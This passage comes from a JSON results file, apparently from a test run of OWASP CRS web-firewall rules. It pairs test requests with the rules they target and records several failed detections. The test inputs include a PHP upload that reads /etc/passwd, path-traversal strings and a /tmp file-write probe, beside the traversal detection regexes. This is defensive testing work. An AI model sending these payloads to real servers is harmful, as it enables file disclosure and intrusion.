          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-multipart-header"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/MULTIPART-ATTACK"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/272/220"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "922130",
    "test_id" : 7,
    "test_path" : "REQUEST-922-MULTIPART-ATTACK/922130.yaml",
    "description" : "Positive test: special character in multipart header.\nRequest is a multipart request with 2 Content-Disposition headers,\nwhere the first one contains a 0x7F character, the first invalid character after the valid range.\n--boundary\nContent\\x7F-Disposition: form-data; name=\"file\"; filename=\"1.php\"\nContent-Disposition: form-data; name=\"post\"\n\n<?php var_dump(file_get_contents(\"/etc/passwd\"));\n--boundary--\n",
    "cause" : "nothing checked for test 7",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)" ]
    },
    "test" : {
      "test_id" : 7,
      "desc" : "Positive test: special character in multipart header.\nRequest is a multipart request with 2 Content-Disposition headers,\nwhere the first one contains a 0x7F character, the first invalid character after the valid range.\n--boundary\nContent\\x7F-Disposition: form-data; name=\"file\"; filename=\"1.php\"\nContent-Disposition: form-data; name=\"post\"\n\n<?php var_dump(file_get_contents(\"/etc/passwd\"));\n--boundary--\n",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "port" : 80,
          "uri" : "/post",
          "version" : "HTTP/1.1",
          "encoded_request" : "UE9TVCAvcG9zdCBIVFRQLzEuMQ0KQWNjZXB0OiAqLyoNCkNvbm5lY3Rpb246IGNsb3NlDQpDb250ZW50LUxlbmd0aDogMTg2DQpDb250ZW50LVR5cGU6IG11bHRpcGFydC9mb3JtLWRhdGE7IGJvdW5kYXJ5PWJvdW5kYXJ5DQpIb3N0OiBsb2NhbGhvc3QNClVzZXItQWdlbnQ6IE9XQVNQIENSUyB0ZXN0IGFnZW50DQoNCi0tYm91bmRhcnkNCkNvbnRlbnR/LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9ImZpbGUiOyBmaWxlbmFtZT0iMS5waHAiDQpDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9InBvc3QiDQoNCjw/cGhwIHZhcl9kdW1wKGZpbGVfZ2V0X2NvbnRlbnRzKCIvZXRjL3Bhc3N3ZCIpKTsNCi0tYm91bmRhcnktLQ=="
        },
        "output" : {
          "log" : {
            "match_regex" : "Multipart parsing error: Multipart: Invalid part header \\(contains invalid character\\)|\\[id \"922130\"\\].*\\[msg \"Multipart header contains characters outside of valid range\"\\]"
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 922130,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " Multipart header names can't contain any characters outside of range 33 and 126,"
        }, {
          "type" : "Comment",
          "text" : " excluding 58 (':') which is the separator."
        }, {
          "type" : "Comment",
          "text" : " RFC 2045 refers RFC 822 about the header syntax."
        }, {
          "type" : "Comment",
          "text" : " Note: this is in phase:2 because these are headers that come in the body"
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "MULTIPART_PART_HEADERS",
          "key" : null
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "[^\\x21-\\x7E][\\x21-\\x39\\x3B-\\x7E]*:"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 922130
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "lowercase"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Multipart header contains characters outside of valid range"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-multipart-header"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/MULTIPART-ATTACK"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/272/220"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "930110",
    "test_id" : 8,
    "test_path" : "REQUEST-930-APPLICATION-ATTACK-LFI/930110.yaml",
    "description" : "Path Traversal Attack (..\\) query string",
    "cause" : "failed expect_id check: 930110 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920460 - Abnormal character escapes in request" ]
    },
    "test" : {
      "test_id" : 8,
      "desc" : "Path Traversal Attack (..\\) query string",
      "stages" : [ {
        "input" : {
          "dest_addr" : "localhost",
          "method" : "GET",
          "port" : 80,
          "headers" : {
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent",
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
          },
          "uri" : "/get?arg=..\\pineapple",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 930110 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 930110,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " [ Decoded /../ or /..;/ Payloads ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " To prevent '..' from triggering, the regexp is split into two parts:"
        }, {
          "type" : "Comment",
          "text" : " - ../"
        }, {
          "type" : "Comment",
          "text" : " - /.."
        }, {
          "type" : "Comment",
          "text" : " OR"
        }, {
          "type" : "Comment",
          "text" : " - .../"
        }, {
          "type" : "Comment",
          "text" : " - /..."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Semicolon added to prevent path traversal via reverse proxy mapping '/..;/' (Tomcat)"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "SimpleVariable",
          "name" : "REQUEST_URI_RAW"
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_HEADERS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_HEADERS",
          "key" : "Referer"
        }, {
          "type" : "CollectionVariable",
          "collection" : "FILES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_HEADERS",
          "key" : "Referer"
        } ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "(?:(?:^|[\\x5c/;])\\.{2,3}[\\x5c/;]|[\\x5c/;]\\.{2,3}[\\x5c/;])"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 930110
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "utf8toUnicode"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "urlDecodeUni"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "removeNulls"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "cmdLine"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Path Traversal Attack (/../) or (/.../)"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-lfi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-LFI"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/255/153/126"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "multi_match"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.lfi_score=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "930110",
    "test_id" : 10,
    "test_path" : "REQUEST-930-APPLICATION-ATTACK-LFI/930110.yaml",
    "description" : "Path Traversal Attack (../) file upload",
    "cause" : "failed expect_id check: 930110 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)" ]
    },
    "test" : {
      "test_id" : 10,
      "desc" : "Path Traversal Attack (../) file upload",
      "stages" : [ {
        "input" : {
          "dest_addr" : "localhost",
          "method" : "POST",
          "port" : 80,
          "headers" : {
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent",
            "Content-Type" : "multipart/form-data; boundary=----WebKitFormBoundaryABCDEFGIJKLMNOPQ",
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
          },
          "uri" : "/post",
          "data" : "------WebKitFormBoundaryABCDEFGIJKLMNOPQ\nContent-Disposition: form-data; name=\"file\"; filename=\"../1.7z\"\nContent-Type: application/octet-stream\n\nBINARYDATA\n------WebKitFormBoundaryABCDEFGIJKLMNOPQ--\n",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 930110 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 930110,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " [ Decoded /../ or /..;/ Payloads ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " To prevent '..' from triggering, the regexp is split into two parts:"
        }, {
          "type" : "Comment",
          "text" : " - ../"
        }, {
          "type" : "Comment",
          "text" : " - /.."
        }, {
          "type" : "Comment",
          "text" : " OR"
        }, {
          "type" : "Comment",
          "text" : " - .../"
        }, {
          "type" : "Comment",
          "text" : " - /..."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Semicolon added to prevent path traversal via reverse proxy mapping '/..;/' (Tomcat)"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "SimpleVariable",
          "name" : "REQUEST_URI_RAW"
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_HEADERS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_HEADERS",
          "key" : "Referer"
        }, {
          "type" : "CollectionVariable",
          "collection" : "FILES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_HEADERS",
          "key" : "Referer"
        } ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "(?:(?:^|[\\x5c/;])\\.{2,3}[\\x5c/;]|[\\x5c/;]\\.{2,3}[\\x5c/;])"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 930110
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "utf8toUnicode"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "urlDecodeUni"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "removeNulls"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "cmdLine"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Path Traversal Attack (/../) or (/.../)"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-lfi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-LFI"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/255/153/126"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "multi_match"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.lfi_score=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "930110",
    "test_id" : 11,
    "test_path" : "REQUEST-930-APPLICATION-ATTACK-LFI/930110.yaml",
    "description" : "Path Traversal Attack (..\\) file upload",
    "cause" : "failed expect_id check: 930110 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920120 - Attempted multipart/form-data bypass", "phase=2 rule_id=920121 - Attempted multipart/form-data bypass", "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)" ]
    },
    "test" : {
      "test_id" : 11,
      "desc" : "Path Traversal Attack (..\\) file upload",
      "stages" : [ {
        "input" : {
          "dest_addr" : "localhost",
          "method" : "POST",
          "port" : 80,
          "headers" : {
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent",
            "Content-Type" : "multipart/form-data; boundary=----WebKitFormBoundaryABCDEFGIJKLMNOPQ",
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
          },
          "uri" : "/post",
          "data" : "------WebKitFormBoundaryABCDEFGIJKLMNOPQ\nContent-Disposition: form-data; name=\"file\"; filename=\"..\\1.7z\"\nContent-Type: application/octet-stream\n\nBINARYDATA\n------WebKitFormBoundaryABCDEFGIJKLMNOPQ--\n",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 930110 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 930110,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " [ Decoded /../ or /..;/ Payloads ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " To prevent '..' from triggering, the regexp is split into two parts:"
        }, {
          "type" : "Comment",
          "text" : " - ../"
        }, {
          "type" : "Comment",
          "text" : " - /.."
        }, {
          "type" : "Comment",
          "text" : " OR"
        }, {
          "type" : "Comment",
          "text" : " - .../"
        }, {
          "type" : "Comment",
          "text" : " - /..."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Semicolon added to prevent path traversal via reverse proxy mapping '/..;/' (Tomcat)"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "SimpleVariable",
          "name" : "REQUEST_URI_RAW"
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_HEADERS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_HEADERS",
          "key" : "Referer"
        }, {
          "type" : "CollectionVariable",
          "collection" : "FILES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_HEADERS",
          "key" : "Referer"
        } ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "(?:(?:^|[\\x5c/;])\\.{2,3}[\\x5c/;]|[\\x5c/;]\\.{2,3}[\\x5c/;])"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 930110
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "utf8toUnicode"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "urlDecodeUni"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "removeNulls"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "cmdLine"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Path Traversal Attack (/../) or (/.../)"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-lfi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-LFI"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/255/153/126"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "multi_match"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.lfi_score=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "930110",
    "test_id" : 12,
    "test_path" : "REQUEST-930-APPLICATION-ATTACK-LFI/930110.yaml",
    "description" : "Path Traversal Attack (;..;) query string",
    "cause" : "failed expect_id check: 930110 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ ]
    },
    "test" : {
      "test_id" : 12,
      "desc" : "Path Traversal Attack (;..;) query string",
      "stages" : [ {
        "input" : {
          "dest_addr" : "localhost",
          "method" : "GET",
          "port" : 80,
          "headers" : {
            "Host" : "localhost",
            "X-FTW" : "This should trip",
            "User-Agent" : "OWASP CRS test agent",
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
          },
          "uri" : "/get?a=..;.\\.;\\.",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 930110 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 930110,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " [ Decoded /../ or /..;/ Payloads ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " To prevent '..' from triggering, the regexp is split into two parts:"
        }, {
          "type" : "Comment",
          "text" : " - ../"
        }, {
          "type" : "Comment",
          "text" : " - /.."
        }, {
          "type" : "Comment",
          "text" : " OR"
        }, {
          "type" : "Comment",
          "text" : " - .../"
        }, {
          "type" : "Comment",
          "text" : " - /..."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Semicolon added to prevent path traversal via reverse proxy mapping '/..;/' (Tomcat)"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "SimpleVariable",
          "name" : "REQUEST_URI_RAW"
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_HEADERS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_HEADERS",
          "key" : "Referer"
        }, {
          "type" : "CollectionVariable",
          "collection" : "FILES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_HEADERS",
          "key" : "Referer"
        } ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "(?:(?:^|[\\x5c/;])\\.{2,3}[\\x5c/;]|[\\x5c/;]\\.{2,3}[\\x5c/;])"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 930110
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "utf8toUnicode"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "urlDecodeUni"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "removeNulls"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "cmdLine"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Path Traversal Attack (/../) or (/.../)"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-lfi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-LFI"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/255/153/126"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "multi_match"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.lfi_score=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "930120",
    "test_id" : 9,
    "test_path" : "REQUEST-930-APPLICATION-ATTACK-LFI/930120.yaml",
    "description" : "YM9WT5NU\nDisallow writing files to /tmp/\n",
    "cause" : "failed expect_id check: 930120 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ ]
    },
    "test" : {
      "test_id" : 9,
      "desc" : "YM9WT5NU\nDisallow writing files to /tmp/\n",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "method" : "GET",
          "port" : 80,
          "headers" : {
            "User-Agent" : "OWASP CRS test agent",
            "Host" : "localhost",
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
          },
          "uri" : "/get?code=>/tmp/curl",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 930120 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 930120,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " -=[ OS File Access ]=-"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " We check for OS file access with the help of a local file with OS files data."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Ref: https://github.com/lightos/Panoptic/blob/master/cases.xml"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " If you wonder where support for Google OAuth2 has gone, see:"
        }, {
          "type" : "Comment",
          "text" : " https://github.com/coreruleset/google-oauth2-plugin"
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "pm_from_file",
        "value" : "lfi-os-files.data"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 930120
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
